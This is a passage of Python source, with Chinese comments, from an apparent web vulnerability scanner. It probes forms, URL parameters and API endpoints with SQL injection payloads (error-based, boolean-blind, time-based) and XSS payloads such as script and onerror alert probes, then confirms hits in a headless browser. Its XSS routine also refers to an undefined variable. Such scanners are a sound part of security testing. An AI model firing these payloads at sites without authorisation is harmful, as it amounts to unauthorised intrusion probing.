        self.log(f"[!] 发现漏洞: {vuln_type} | {details} | 置信度: {confidence}")


    # 表单提取（保留简单接口）


    def extract_forms(self, url: str) -> List[Dict]:
        """从URL提取表单"""
        try:
            resp = self.session.get(url, timeout=8, allow_redirects=True)
            self.csrf_handler.cache_page(url, response=resp)
            text = resp.text or ""

            soup = BeautifulSoup(text, "html.parser")
            forms = []
            for form_tag in soup.find_all("form"):
                method = (form_tag.get("method") or "get").lower()
                action = form_tag.get("action") or ""
                form_url = urljoin(url, action) if action else url

                inputs = []
                for inp in form_tag.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    if not name:
                        continue
                    itype = inp.get("type", "text")
                    inputs.append({"name": name, "type": itype, "value": inp.get("value", "")})

                if inputs:
                    forms.append({"url": form_url, "method": method, "inputs": inputs})

            return forms
        except Exception as e:
            self.log(f"[-] 提取表单失败: {e}")
            return []


    # 主扫描流程


    def _scan(self, url):
        try:
            self.current_url = url
            self.log("[*] 开始扫描: " + url)

            # 获取初始页面内容（供后续分析复用）
            try:
                base_resp = self.session.get(url, timeout=8, allow_redirects=True)
                self.csrf_handler.cache_page(url, response=base_resp)
                base_html = base_resp.text or ""
            except Exception:
                base_html = ""

            # === 阶段 0: 爬虫发现 + API 参数推断 ===
            self.log("[*] ===== 扫描阶段 0/5: 爬虫发现端点 + API 参数推断 =====")
            discovered = {"links": [], "forms": [], "js_endpoints": [], "api_paths": []}
            api_infos = []
            try:
                discovered = self.crawler.discover(url)
                all_forms = self.extract_forms(url)
                all_forms.extend(discovered["forms"])

                # API 参数结构推断
                if base_html:
                    try:
                        api_infos = self.api_discoverer.discover_from_page(base_html, url)
                        if api_infos:
                            self.log(f"[+] 推断出 {len(api_infos)} 个 API 端点参数结构")
                    except Exception as e:
                        self.log(f"[-] API参数推断异常: {e}")
            except Exception as e:
                self.log(f"[-] 爬虫阶段异常: {e}，降级为当前页面表单")
                all_forms = self.extract_forms(url)

            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            self.log(f"[+] URL参数: {list(query_params.keys())}, 表单: {len(all_forms)}")

            if api_endpoints := list(discovered.get("js_endpoints", [])) + list(discovered.get("api_paths", [])):
                self.log(f"[+] 发现可能API端点: {len(api_endpoints)} 个")

            # === 阶段 1: SQL Injection (Error-based + Boolean-blind) ===
            self.log("[*] ===== 扫描阶段 1/5: SQL注入 (错误型 + 布尔盲注) =====")
            try:
                self._scan_sql_forms(url, all_forms)
            except Exception as e:
                self.log(f"[-] 阶段1(表单SQL)异常: {e}")
            if query_params and self.running:
                try:
                    self._scan_sql_get(url, query_params)
                except Exception as e:
                    self.log(f"[-] 阶段1(URL参数SQL)异常: {e}")

            # 对发现的 API 端点也做 SQL 注入测试（POST JSON）
            if api_infos and self.running:
                try:
                    self._scan_sql_api(url, api_infos)
                except Exception as e:
                    self.log(f"[-] 阶段1(API SQL)异常: {e}")

            # === 阶段 2: SQL Injection (Time-based) ===
            self.log("[*] ===== 扫描阶段 2/5: SQL注入 (时间盲注 - 统计方法) =====")
            try:
                if self.running:
                    self._scan_sql_time_forms(url, all_forms)
            except Exception as e:
                self.log(f"[-] 阶段2(表单时间盲注)异常: {e}")
            if query_params and self.running:
                try:
                    self._scan_sql_time_get(url, query_params)
                except Exception as e:
                    self.log(f"[-] 阶段2(URL时间盲注)异常: {e}")

            # === 阶段 3: XSS (HTTP源码 + Context-aware) ===
            self.log("[*] ===== 扫描阶段 3/5: XSS (源码检测 + 上下文感知) =====")
            try:
                if self.running:
                    self._scan_xss(url, all_forms, query_params)
            except Exception as e:
                self.log(f"[-] 阶段3(XSS源码)异常: {e}")

            # === 阶段 4: DOM XSS 静态分析 (JS Sink) ===
            self.log("[*] ===== 扫描阶段 4/5: DOM XSS (JS Sink 静态分析) =====")
            try:
                if base_html and self.running:
                    dom_findings = self.js_sink_analyzer.analyze_page(base_html, url)
                    for f in dom_findings:
                        sev = f.get("severity", "low")
                        conf = f.get("confidence", 0.3)
                        self.report_vuln(
                            vuln_type="DOM XSS (潜在)",
                            details=f.get("description", f"危险Sink: {f.get('sink')}"),
                            payload=f.get("evidence", "")[:200],
                            confidence=f"{'high' if conf > 0.6 else 'medium' if conf > 0.4 else 'low'}"
                        )
                    self.log(f"[+] DOM XSS 分析完成，发现 {len(dom_findings)} 个潜在风险点")
            except Exception as e:
                self.log(f"[-] 阶段4(DOM XSS)异常: {e}")

            # === 阶段 5: Playwright 浏览器爬虫 + 验证 ===
            self.log("[*] ===== 扫描阶段 5/5: Playwright 浏览器爬虫 + 验证 =====")
            try:
                if self.running:
                    self._scan_xss_browser(url, all_forms, query_params, api_infos)
            except Exception as e:
                self.log(f"[-] 阶段5(浏览器验证)异常: {e}（浏览器不可用则跳过此阶段）")

            self.log(f"[+] 扫描完成，共发现 {len(self.found_vulns)} 个漏洞")
        except Exception as e:
            self.log(f"[FATAL] 扫描全程异常: {e}")


    # SQL 注入检测（表单）


    def _scan_sql_forms(self, base_url: str, forms: List[Dict]):
        """表单 SQL 注入检测"""
        for form in forms:
            if not self.running:
                return

            form_url = form["url"]
            method = form["method"]
            inputs = form["inputs"]
            text_inputs = [i for i in inputs if not is_skipped_input(i.get("type", ""))]

            if not text_inputs:
                continue

            # 分析表单
            analysis = self.analyzer.analyze_form(form)
            if analysis["has_csrf"]:
                self.log(f"[+] 检测到CSRF保护字段: {analysis['csrf_fields']}")

            # 正常请求的基准
            normal_data = {i["name"]: "test_normal_value_123" for i in text_inputs}

            try:
                normal_resp = self.request_engine.send(form_url, method, normal_data, content_type="form")
            except Exception:
                normal_resp = None

            # 为每个文本输入分别测试
            for idx, inp in enumerate(text_inputs):
                if not self.running:
                    return

                field_name = inp["name"]

                # --- 1. Error-based ---
                error_payloads = self.mutator.generate_sql_error_payloads(max_count=8)
                for payload in error_payloads:
                    if not self.running:
                        return

                    test_data = dict(normal_data)
                    test_data[field_name] = payload
                    try:
                        resp = self.request_engine.send(form_url, method, test_data, content_type="form")
                    except Exception:
                        continue

                    if resp is None:
                        continue

                    text_lower = (resp.text or "").lower()
                    if any(err in text_lower for err in SQL_ERROR_STRINGS):
                        self.report_vuln(
                            "SQL注入漏洞 (Error-based)",
                            f"表单参数 {field_name} (原始值: {payload[:30]})",
                            payload=payload,
                            confidence="high"
                        )
                        break

                # --- 2. Boolean-based Blind (Diff Engine) ---
                if self.running:
                    self._test_boolean_blind_form(form_url, method, text_inputs, idx, field_name)

    def _test_boolean_blind_form(self, form_url: str, method: str, inputs: List[Dict],
                                   test_idx: int, field_name: str):
        """布尔盲注检测 - 使用 Diff Engine 三向比较"""
        normal_data = {i["name"]: "test_value" for i in inputs}

        # 先取 normal response
        try:
            normal_resp = self.request_engine.send(form_url, method, normal_data, content_type="form")
        except Exception:
            return
        if normal_resp is None:
            return

        # 获取 TRUE payload
        true_payloads = self.mutator.generate_sql_true_payloads(max_count=5)
        false_payloads = ["' AND '1'='2", "1 AND 1=2", "0"]

        for true_p in true_payloads[:3]:
            if not self.running:
                return

            # TRUE 请求
            true_data = dict(normal_data)
            true_data[field_name] = true_p
            try:
                true_resp = self.request_engine.send(form_url, method, true_data, content_type="form")
            except Exception:
                continue

            if true_resp is None:
                continue

            # 检查错误型
            text_lower = (true_resp.text or "").lower()
            if any(err in text_lower for err in SQL_ERROR_STRINGS):
                self.report_vuln(
                    "SQL注入漏洞 (Boolean-blind / Error)",
                    f"表单参数 {field_name}",
                    payload=true_p,
                    confidence="high"
                )
                return

            # FALSE 请求
            false_p = false_payloads[0]
            false_data = dict(normal_data)
            false_data[field_name] = false_p
            try:
                false_resp = self.request_engine.send(form_url, method, false_data, content_type="form")
            except Exception:
                continue

            if false_resp is None:
                continue

            # 三向比较
            diff_result = self.diff_engine.three_way_compare(normal_resp, true_resp, false_resp)
            if diff_result["likely_blind_sqli"]:
                self.report_vuln(
                    "SQL注入漏洞 (Boolean-blind)",
                    f"表单参数 {field_name} - Diff: TRUE≠FALSE且FALSE≈NORMAL "
                    f"({diff_result['summary_true_vs_false']})",
                    payload=true_p,
                    confidence="medium"
                )
                return


    # SQL 注入检测（URL参数）


    def _scan_sql_get(self, url: str, query_params: Dict):
        """URL 参数 SQL 注入检测"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param_name in query_params:
            if not self.running:
                return

            # 基准
            normal_params = {k: "test_value" for k in query_params}

            try:
                normal_resp = self.session.get(base_url, params=normal_params, timeout=8)
            except Exception:
                continue

            if normal_resp is None:
                continue

            # Error-based
            error_payloads = self.mutator.generate_sql_error_payloads(max_count=8)
            for payload in error_payloads:
                if not self.running:
                    return
                test_params = dict(normal_params)
                test_params[param_name] = payload
                try:
                    resp = self.session.get(base_url, params=test_params, timeout=8)
                except Exception:
                    continue

                if resp is None:
                    continue
                text_lower = (resp.text or "").lower()
                if any(err in text_lower for err in SQL_ERROR_STRINGS):
                    self.report_vuln(
                        "SQL注入漏洞 (Error-based)",
                        f"URL参数 {param_name}",
                        payload=payload,
                        confidence="high"
                    )
                    break

            # Boolean blind
            if self.running:
                true_payloads = self.mutator.generate_sql_true_payloads(max_count=4)
                for true_p in true_payloads[:2]:
                    if not self.running:
                        return
                    test_params_t = dict(normal_params)
                    test_params_t[param_name] = true_p
                    test_params_f = dict(normal_params)
                    test_params_f[param_name] = "1 AND 1=2"

                    try:
                        true_resp = self.session.get(base_url, params=test_params_t, timeout=8)
                        false_resp = self.session.get(base_url, params=test_params_f, timeout=8)
                    except Exception:
                        continue

                    if true_resp and false_resp:
                        diff_result = self.diff_engine.three_way_compare(normal_resp, true_resp, false_resp)
                        if diff_result["likely_blind_sqli"]:
                            self.report_vuln(
                                "SQL注入漏洞 (Boolean-blind)",
                                f"URL参数 {param_name}",
                                payload=true_p,
                                confidence="medium"
                            )
                            break


    # 时间盲注（表单 + URL）

    def _scan_sql_time_forms(self, base_url: str, forms: List[Dict]):
        for form in forms:
            if not self.running:
                return
            form_url = form["url"]
            method = form["method"]
            inputs = form["inputs"]
            text_inputs = [i for i in inputs if not is_skipped_input(i.get("type", ""))]
            if not text_inputs:
                continue

            for inp in text_inputs:
                if not self.running:
                    return
                field_name = inp["name"]
                normal_data = {i["name"]: "test_val" for i in text_inputs}

                for sleep_payload in SQL_SEED_TIME[:3]:
                    if not self.running:
                        return
                    inj_data = dict(normal_data)
                    inj_data[field_name] = sleep_payload

                    result = self.time_blind.test_time_blind(
                        form_url, method, normal_data, inj_data,
                        content_type="form", sleep_seconds=3, samples=3
                    )

                    if result["is_vulnerable"]:
                        self.report_vuln(
                            "SQL注入漏洞 (Time-based Blind)",
                            f"表单参数 {field_name} - baseline={result['baseline_mean']}s test={result['test_mean']}s "
                            f"z_score={result['z_score']}",
                            payload=sleep_payload,
                            confidence="high"
                        )
                        break

    def _scan_sql_time_get(self, url: str, query_params: Dict):
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param_name in list(query_params.keys())[:3]:
            if not self.running:
                return

            normal_params = {k: "test_val" for k in query_params}

            for sleep_payload in SQL_SEED_TIME[:3]:
                if not self.running:
                    return
                inj_params = dict(normal_params)
                inj_params[param_name] = sleep_payload

                result = self.time_blind.test_time_blind(
                    base_url, "GET", normal_params, inj_params,
                    content_type="form", sleep_seconds=3, samples=3
                )

                if result["is_vulnerable"]:
                    self.report_vuln(
                        "SQL注入漏洞 (Time-based Blind)",
                        f"URL参数 {param_name} - baseline={result['baseline_mean']}s test={result['test_mean']}s "
                        f"z_score={result['z_score']}",
                        payload=sleep_payload,
                        confidence="high"
                    )
                    break


    # SQL 注入检测（API JSON 端点）

    def _scan_sql_api(self, base_url: str, api_infos: List[Dict]):
        """对发现的 API 端点做 SQL 注入测试（JSON body）"""
        tested = 0
        for api_info in api_infos:
            if not self.running:
                return

            endpoint = api_info.get("endpoint", "")
            method = api_info.get("method", "GET").upper()
            params_struct = api_info.get("params_structure", {})
            params_type = api_info.get("params_type", "query")
            confidence = api_info.get("confidence", 0.3)

            if not endpoint or not params_struct:
                continue

            # 只测试 POST/PUT/PATCH（JSON body）
            if method not in ["POST", "PUT", "PATCH"] and params_type not in ["json"]:
                continue
            if confidence < 0.5:
                continue

            tested += 1
            self.log(f"[SQL-API] 测试API端点: {method} {endpoint[:60]}")

            # 构造示例参数
            test_params = {}
            for k, v in params_struct.items():
                if isinstance(v, dict):
                    test_params[k] = v.get("example", "test")
                else:
                    test_params[k] = "test"

            if not test_params:
                continue

            # 对每个参数做 error-based SQL 注入
            for param_name in test_params.keys():
                if not self.running:
                    return

                sql_payloads = self.mutator.generate_sql_payloads("error_based", max_count=8)

                for payload in sql_payloads:
                    if not self.running:
                        return

                    injection_params = dict(test_params)
                    injection_params[param_name] = payload

                    try:
                        resp = self.request_engine.send(
                            endpoint, method, injection_params, content_type="json"
                        )
                    except Exception:
                        continue

                    if resp is None:
                        continue

                    resp_text = resp.text or ""
                    status = resp.status_code

                    # 检测错误信息
                    for err in SQL_ERRORS:
                        if err.lower() in resp_text.lower():
                            self.report_vuln(
                                "SQL注入漏洞 (API)",
                                f"API端点 {endpoint} 参数 {param_name}",
                                payload=payload,
                                confidence="medium"
                            )
                            break
                    else:
                        continue
                    break

        self.log(f"[SQL-API] 共测试 {tested} 个 API 端点")


    # XSS 检测（HTTP 源码 + 上下文感知）


    def _scan_xss(self, url: str, forms: List[Dict], query_params: Dict):
        # --- 表单 XSS ---
        for form in forms:
            if not self.running:
                return
            form_url = form["url"]
            method = form["method"]
            inputs = form["inputs"]
            text_inputs = [i for i in inputs if not is_skipped_input(i.get("type", ""))]
            if not text_inputs:
                continue

            for inp in text_inputs:
                if not self.running:
                    return
                field_name = inp["name"]

                # 先检测反射 - 用无害字符串找上下文
                probe = "xssprobe_xyz123"
                normal_data = {i["name"]: "test" for i in text_inputs}
                probe_data = dict(normal_data)
                probe_data[field_name] = probe

                try:
                    probe_resp = self.request_engine.send(form_url, method, probe_data, content_type="form")
                except Exception:
                    continue

                if probe_resp is None:
                    continue

                # 检测上下文
                context_info = self.analyzer.detect_context(probe_resp.text or "", probe)
                self.log(f"[DEBUG] 参数 {field_name} 反射上下文: {context_info.get('context', 'unknown')} "
                         f"(置信度: {context_info.get('confidence', 0)})")

                # 根据上下文生成 payload（优先用 context-aware，再用 mutation 补充）
                context_payloads = self.analyzer.generate_context_payloads(context_info, max_count=8)
                mutation_payloads = self.mutator.generate_xss_payloads(
                    context=context_info.get("context", "html"), max_count=8
                )
                payloads = context_payloads + [p for p in mutation_payloads if p not in context_payloads]
                payloads = payloads[:16]

                for payload in payloads:
                    if not self.running:
                        return
                    test_data = dict(normal_data)
                    test_data[field_name] = payload

                    try:
                        resp = self.request_engine.send(form_url, method, test_data, content_type="form")
                    except Exception:
                        continue

                    if resp is None:
                        continue
                    text = resp.text or ""

                    # 多层解码后检测
                    decoded_text = decode_all(text)
                    decoded_payload = decode_all(payload)

                    # 简单 payload 判断（alert/script）
                    payload_lower = payload.lower()
                    has_alert_marker = "alert" in payload_lower or "confirm" in payload_lower or "prompt" in payload_lower
                    if has_alert_marker and ("alert(" in decoded_text or "alert&#40;" in text.lower()):
                        self.report_vuln(
                            f"XSS漏洞 ({context} context)",
                            f"表单参数 {field_name}",
                            payload=payload,
                            confidence="high"
                        )
                        break

                    # 标签未过滤的强信号
                    if "<script" in text.lower() and payload_lower.replace(" ", "") in text.lower().replace(" ", ""):
                        self.report_vuln(
                            f"XSS漏洞 (Stored/Reflected)",
                            f"表单参数 {field_name} - 检测到 <script> 标签",
                            payload=payload,
                            confidence="high"
                        )
                        break

                    # img/onerror 事件
                    if ("onerror" in text.lower() or "onload" in text.lower()) and \
                       any(tag in text.lower() for tag in ["<img", "<svg", "<body", "<iframe"]):
                        # 验证 payload 是否在响应中
                        check_text = text.lower().replace(" ", "").replace("\t", "").replace("\n", "")
                        check_payload = payload.lower().replace(" ", "").replace("\t", "").replace("\n", "")
                        if check_payload[:20] in check_text:
                            self.report_vuln(
                                f"XSS漏洞 (Event Handler)",
                                f"表单参数 {field_name}",
                                payload=payload,
                                confidence="medium"
                            )
                            break

        # --- URL 参数 XSS ---
        if query_params and self.running:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param_name in list(query_params.keys())[:3]:
                if not self.running:
                    return
                normal_params = {k: "test" for k in query_params}
                probe_params = dict(normal_params)
                probe_params[param_name] = "xssprobe_xyz"

                try:
                    probe_resp = self.session.get(base_url, params=probe_params, timeout=8)
                except Exception:
                    continue

                if probe_resp is None:
                    continue

                context_info = self.analyzer.detect_context(probe_resp.text or "", "xssprobe_xyz")
                self.log(f"[DEBUG] URL参数 {param_name} 反射上下文: {context_info.get('context', 'unknown')}")

                context_payloads = self.analyzer.generate_context_payloads(context_info, max_count=8)
                mutation_payloads = self.mutator.generate_xss_payloads(
                    context=context_info.get("context", "html"), max_count=8
                )
                payloads = context_payloads + [p for p in mutation_payloads if p not in context_payloads]
                payloads = payloads[:14]

                for payload in payloads:
                    if not self.running:
                        return
                    test_params = dict(normal_params)
                    test_params[param_name] = payload
                    try:
                        resp = self.session.get(base_url, params=test_params, timeout=8)
                    except Exception:
                        continue

                    if resp is None:
                        continue
                    text = resp.text or ""
                    decoded_text = decode_all(text)

                    if "alert(" in decoded_text or "<script" in text.lower():
                        self.report_vuln(
                            f"XSS漏洞 (URL参数 - {context})",
                            f"URL参数 {param_name}",
                            payload=payload,
                            confidence="high"
                        )
                        break


    # XSS Playwright 浏览器验证


    def _launch_browser(self):
        """启动 Playwright 浏览器实例"""
        try:
            if self.playwright is None:
                self.playwright = sync_playwright().start()

            # 尝试多个浏览器位置
            for launcher in [lambda: self.playwright.chromium.launch(headless=True),
                           lambda: self.playwright.chromium.launch(headless=True, channel="chrome")]:
                try:
                    self.browser = launcher()
                    return True
                except Exception as e:
                    self.log(f"[-] 浏览器启动失败: {e}")
                    continue
            return False
        except Exception as e:
            self.log(f"[-] Playwright 初始化失败: {e}")
            return False

    def _close_browser(self):
        """彻底关闭浏览器和 playwright 实例"""
        try:
            if self.browser:
                try:
                    self.browser.close()
                except Exception:
                    pass
                self.browser = None
        except Exception:
            pass
        try:
            if self.playwright:
                try:
                    self.playwright.stop()
                except Exception:
                    pass
                self.playwright = None
        except Exception:
            pass

    def _scan_xss_browser(self, url: str, forms: List[Dict], query_params: Dict, api_infos: List[Dict] = None):
        """使用 Playwright 浏览器验证 XSS（含动态爬虫）"""

        if not self._launch_browser():
            self.log("[-] Playwright 浏览器不可用，跳过浏览器验证")
            return

        # === 子阶段 A: 浏览器动态爬虫 ===
        self.log("[*] --- Playwright 子阶段 A: 动态爬虫发现 ---")
        try:
            from urllib.parse import urlparse
            base_domain = urlparse(url).netloc
            self.browser_crawler.set_browser(self.browser)
            crawl_result = self.browser_crawler.crawl(url, base_domain)

            # 把爬虫发现的表单加入检测列表
            if crawl_result["discovered_forms"]:
                new_forms = crawl_result["discovered_forms"]
                existing_actions = {f.get("url", "") for f in forms}
                for f in new_forms:
                    if f.get("action", "") not in existing_actions:
                        f["url"] = f.get("action", "")
                        forms.append(f)
                self.log(f"[+] 浏览器爬虫新增 {len(new_forms)} 个动态表单")
        except Exception as e:
            self.log(f"[-] 浏览器爬虫异常: {e}")

        start_time = time.time()
        alert_triggered = {"found": False, "details": ""}

        def _on_dialog(dialog):
            try:
                msg = dialog.message
                alert_triggered["found"] = True
                alert_triggered["details"] = f"alert: {msg}"
                dialog.dismiss()
            except Exception:
                try:
                    dialog.dismiss()
                except Exception:
                    pass

        # 设置 cookies
        context = None
        page = None
        try:
            context = self.browser.new_context(
                user_agent="Mozilla/5.0 AI-Safe-Scanner/2.0",
                viewport={"width": 1280, "height": 720}
            )

            # 同步 requests session 的 cookies
            for cookie in self.session.cookies:
                try:
                    context.add_cookies([{
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain or urlparse(url).hostname,
                        "path": cookie.path or "/"
                    }])
                except Exception:
                    pass

            page = context.new_page()
            page.on("dialog", _on_dialog)

            #  表单 XSS 浏览器验证
            for form in forms:
                if not self.running or time.time() - start_time > PLAYWRIGHT_TOTAL_TIMEOUT:
                    break
                form_url = form["url"]
                inputs = form["inputs"]
                text_inputs = [i for i in inputs if not is_skipped_input(i.get("type", ""))]
                if not text_inputs:
                    continue

                for inp in text_inputs:
                    if not self.running or time.time() - start_time > PLAYWRIGHT_TOTAL_TIMEOUT:
                        break
                    field_name = inp["name"]

                    # 用简单可靠的 payload 测试
                    browser_payloads = [
                        "<script>alert(document.domain)</script>",
                        "<img src=x onerror=alert(document.domain)>",
                        "\" onmouseover=alert(1) x=\"",
                        "' onmouseover=alert(1) x='",
                        "<svg onload=alert(1)>",
                    ]

                    for payload in browser_payloads:
                        if not self.running or time.time() - start_time > PLAYWRIGHT_TOTAL_TIMEOUT:
                            break

                        alert_triggered["found"] = False
                        try:
                            # 先访问表单页面
                            try:
                                page.goto(form_url, timeout=15000, wait_until="domcontentloaded")
                            except Exception:
                                pass

                            # 填充字段 + 提交
                            csrf_tokens = self.csrf_handler.get_tokens_for_url(form_url)

                            try:
                                input_el = page.locator(f"[name='{field_name}']").first
                                if input_el.count() > 0:
                                    input_el.fill(payload)
                            except Exception:
                                pass

                            # 填充 CSRF token 字段
                            for ck, cv in csrf_tokens.items():
                                try:
                                    el = page.locator(f"[name='{ck}']").first
                                    if el.count() > 0:
                                        el.fill(cv)
                                except Exception:
                                    pass

                            # 提交表单
                            try:
                                page.locator("input[type=submit]").first.click(timeout=3000)
                            except Exception:
                                try:
                                    page.locator("button[type=submit]").first.click(timeout=3000)
                                except Exception:
                                    try:
                                        page.evaluate("document.forms[0].submit()")
                                    except Exception:
                                        pass

                            # 等待 alert
                            time.sleep(1.5)

                            if alert_triggered["found"]:
                                self.report_vuln(
                                    "XSS漏洞 (浏览器验证确认)",
                                    f"表单参数 {field_name} - 检测到弹窗: {alert_triggered['details']}",
                                    payload=payload,
                                    confidence="high"
                                )
                                break
                        except Exception as e:
                            continue

            # URL 参数 XSS 浏览器验证
            if query_params and self.running and time.time() - start_time < PLAYWRIGHT_TOTAL_TIMEOUT:
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                for param_name in list(query_params.keys())[:3]:
                    if not self.running or time.time() - start_time > PLAYWRIGHT_TOTAL_TIMEOUT:
                        break

                    payload = "<script>alert(document.domain)</script>"
                    test_params = {k: "test" for k in query_params}
                    test_params[param_name] = payload

                    try:
                        test_url = f"{base_url}?{urlencode(test_params)}"
                        alert_triggered["found"] = False
                        page.goto(test_url, timeout=15000, wait_until="domcontentloaded")
                        time.sleep(1.5)

                        if alert_triggered["found"]:
                            self.report_vuln(
                                "XSS漏洞 (浏览器验证确认)",
                                f"URL参数 {param_name}",
                                payload=payload,
                                confidence="high"
                            )
                    except Exception:
                        continue

        except Exception as e:
            self.log(f"[-] 浏览器扫描异常: {e}")
        finally:
            self._close_browser()

    # 扫描启动接口（保持向后兼容）


    def get_results(self) -> dict:
        """返回标准化扫描结果（GUI 兼容格式）"""
        return {
            "url": self.current_url,
            "vuln_count": len(self.found_vulns),
            "vulnerabilities": self.found_vulns,
            "logs": self.scan_logs[-300:] if self.scan_logs else [],
        }

    def start_scan(self, url):
        self.running = True
        self.found_vulns = []
        self.scan_logs = []
        try:
            self._scan(url)
        except Exception as e:
            self.log(f"[FATAL] 扫描流程异常: {e}")
        finally:
            self.running = False
            self._close_browser()

    def stop(self):
        self.running = False
        self._close_browser()
